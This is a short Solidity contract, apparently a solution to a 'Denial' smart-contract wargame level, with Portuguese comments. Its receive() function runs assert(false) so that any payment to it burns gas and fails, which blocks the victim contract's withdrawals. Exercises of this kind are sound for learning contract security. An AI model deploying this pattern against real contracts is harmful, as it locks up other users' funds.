//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import './Denial.sol';

contract AttackDenial {

    Denial public victim;

    constructor (address payable _victimAddr){
        victim = Denial(_victimAddr);
    }


    receive() external payable{
        //emit EventName()
        // require("") // revert("erro") //retorna o G�S
        assert(false); //n�o retorna o G�S
    }

    function getContractBalance() public view returns (uint){
        return address(this).balance;
    }


}